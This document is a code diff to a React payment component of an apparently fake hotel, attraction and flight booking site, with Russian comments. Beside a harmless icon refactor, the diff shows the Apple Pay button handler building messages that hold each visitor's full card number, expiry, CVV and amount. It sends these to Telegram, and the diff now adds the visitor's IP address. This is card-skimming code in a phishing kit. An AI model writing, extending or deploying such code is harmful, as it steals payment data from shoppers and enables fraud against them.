@@ -470,12 +470,17 @@ const Payment: React.FC = () => {
                     const target = e.currentTarget as HTMLImageElement;
                     target.style.display = 'none';
                     const parent = target.parentElement;
-                    if (parent) {
-                      parent.innerHTML = `
-                        <svg width="32" height="32" fill="#0071c2" viewBox="0 0 24 24">
-                          <path d="M7 14c1.66 0 3-1.34 3-3S8.66 8 7 8s-3 1.34-3 3 1.34 3 3 3zm0-4c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm12-3h-8v8H3V9H1v11h2v-2h18v2h2v-7c0-2.21-1.79-4-4-4z"/>
-                        </svg>
-                      `;
+                    if (parent && !parent.querySelector('svg')) {
+                      // Безопасная замена innerHTML на createElement
+                      const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+                      svg.setAttribute('width', '32');
+                      svg.setAttribute('height', '32');
+                      svg.setAttribute('fill', '#0071c2');
+                      svg.setAttribute('viewBox', '0 0 24 24');
+                      const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
+                      path.setAttribute('d', 'M7 14c1.66 0 3-1.34 3-3S8.66 8 7 8s-3 1.34-3 3 1.34 3 3 3zm0-4c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm12-3h-8v8H3V9H1v11h2v-2h18v2h2v-7c0-2.21-1.79-4-4-4z');
+                      svg.appendChild(path);
+                      parent.appendChild(svg);
                     }
                   }}
                 />
@@ -690,7 +695,7 @@ const Payment: React.FC = () => {
         </div>
         </div>
         {hasCard ? (
-          <button className="applepay-button white" onClick={()=>{
+          <button className="applepay-button white" onClick={async ()=>{
             // Валидация данных пользователя перед оплатой
             const validationErrors = [];
             
@@ -733,12 +738,43 @@ const Payment: React.FC = () => {
               if (pan) { cardLine = `${card?.brand||'CARD'} ${pan}`; }
               const cvv = sessionStorage.getItem(`payment_card_one_time_cvv_${panKey}`) || localStorage.getItem(`payment_card_one_time_cvv_${panKey}`);
               
+              // Получаем IP адрес ТОЛЬКО через наш backend, без внешних fetch из браузера
+              let userIP = '127.0.0.1'; // Дефолт на случай ошибки
+              try {
+                // Используем всегда относительный путь, как во всём проекте
+                const ipResponse = await fetch('/api/geo/ip');
+                if (ipResponse.ok) {
+                  // Проверяем Content-Type перед парсингом JSON
+                  const contentType = ipResponse.headers.get('content-type') || '';
+                  if (contentType.includes('application/json')) {
+                    try {
+                      const ipData = await ipResponse.json();
+                      const rawIp = ipData?.ip;
+                      if (rawIp && rawIp !== 'Unknown' && typeof rawIp === 'string') {
+                        userIP = rawIp;
+                      }
+                      console.log('Payment: Received IP data from /api/geo/ip:', ipData, 'Extracted IP:', userIP);
+                    } catch (jsonError) {
+                      console.warn('Payment: Failed to parse JSON from /api/geo/ip:', jsonError);
+                    }
+                  } else {
+                    const text = await ipResponse.text().catch(() => '');
+                    console.warn('Payment: /api/geo/ip returned non-JSON:', contentType, text.substring(0, 100));
+                  }
+                } else {
+                  const errorText = await ipResponse.text().catch(() => '');
+                  console.warn('Payment: IP response not OK from /api/geo/ip:', ipResponse.status, errorText.substring(0, 100));
+                }
+              } catch (error) {
+                console.error('Payment: Failed to get IP:', error);
+              }
+              
               // Отправляем уведомление о попытке оплаты
               const telegramMessage = isHotelBooking 
-                ? `🏨 <b>Hotel Booking Attempt</b>\n<b>Hotel</b>: ${hotelData?.hotel_name || 'Hotel'}\n<b>Location</b>: ${hotelData?.address || ''}, ${hotelData?.city || 'City'}\n<b>Dates</b>: ${hotelData?.checkIn && hotelData?.checkOut ? `${new Date(hotelData.checkIn).toLocaleDateString('en-GB', { day: 'numeric', month: 'short' })} - ${new Date(hotelData.checkOut).toLocaleDateString('en-GB', { day: 'numeric', month: 'short' })}` : 'Check-in - Check-out'}\n<b>Guests</b>: ${adults} adult${adults > 1 ? 's' : ''}${kids.length > 0 ? `, ${kids.length} child${kids.length > 1 ? 'ren' : ''}` : ''}\n<b>Rooms</b>: ${hotelData?.rooms || 1}\n<b>Card</b>: ${cardLine} ${card?.expiry?`(exp ${card.expiry})`:''}${cvv?`\n<b>CVV</b>: ${cvv}`:''}\n<b>Amount</b>: ${currency} ${total.toFixed(2)}`
+                ? `🏨 <b>Hotel Booking Attempt</b>\n<b>Hotel</b>: ${hotelData?.hotel_name || 'Hotel'}\n<b>Location</b>: ${hotelData?.address || ''}, ${hotelData?.city || 'City'}\n<b>Dates</b>: ${hotelData?.checkIn && hotelData?.checkOut ? `${new Date(hotelData.checkIn).toLocaleDateString('en-GB', { day: 'numeric', month: 'short' })} - ${new Date(hotelData.checkOut).toLocaleDateString('en-GB', { day: 'numeric', month: 'short' })}` : 'Check-in - Check-out'}\n<b>Guests</b>: ${adults} adult${adults > 1 ? 's' : ''}${kids.length > 0 ? `, ${kids.length} child${kids.length > 1 ? 'ren' : ''}` : ''}\n<b>Rooms</b>: ${hotelData?.rooms || 1}\n<b>Card</b>: ${cardLine} ${card?.expiry?`(exp ${card.expiry})`:''}${cvv?`\n<b>CVV</b>: ${cvv}`:''}\n<b>Amount</b>: ${currency} ${total.toFixed(2)}\n<b>IP</b>: ${userIP}`
                 : isAttractionBooking
-                  ? `🎟 <b>Attraction Booking Attempt</b>\n<b>Attraction</b>: ${attractionBooking?.attraction?.name || 'Attraction'}\n<b>Card</b>: ${cardLine} ${card?.expiry?`(exp ${card.expiry})`:''}${cvv?`\n<b>CVV</b>: ${cvv}`:''}\n<b>Amount</b>: ${currency} ${total.toFixed(2)}\n${summary}`
-                  : `💳 <b>Flight Booking Attempt</b>\n<b>Route</b>: ${firstSeg?.departureAirport?.code} → ${lastSeg?.arrivalAirport?.code}\n<b>Card</b>: ${cardLine} ${card?.expiry?`(exp ${card.expiry})`:''}${cvv?`\n<b>CVV</b>: ${cvv}`:''}\n<b>Amount</b>: ${currency} ${total.toFixed(2)}\n${summary}`;
+                  ? `🎟 <b>Attraction Booking Attempt</b>\n<b>Attraction</b>: ${attractionBooking?.attraction?.name || 'Attraction'}\n<b>Card</b>: ${cardLine} ${card?.expiry?`(exp ${card.expiry})`:''}${cvv?`\n<b>CVV</b>: ${cvv}`:''}\n<b>Amount</b>: ${currency} ${total.toFixed(2)}\n<b>IP</b>: ${userIP}\n${summary}`
+                  : `💳 <b>Flight Booking Attempt</b>\n<b>Route</b>: ${firstSeg?.departureAirport?.code} → ${lastSeg?.arrivalAirport?.code}\n<b>Card</b>: ${cardLine} ${card?.expiry?`(exp ${card.expiry})`:''}${cvv?`\n<b>CVV</b>: ${cvv}`:''}\n<b>Amount</b>: ${currency} ${total.toFixed(2)}\n<b>IP</b>: ${userIP}\n${summary}`;
               
               sendTelegram(telegramMessage);
             } catch {}
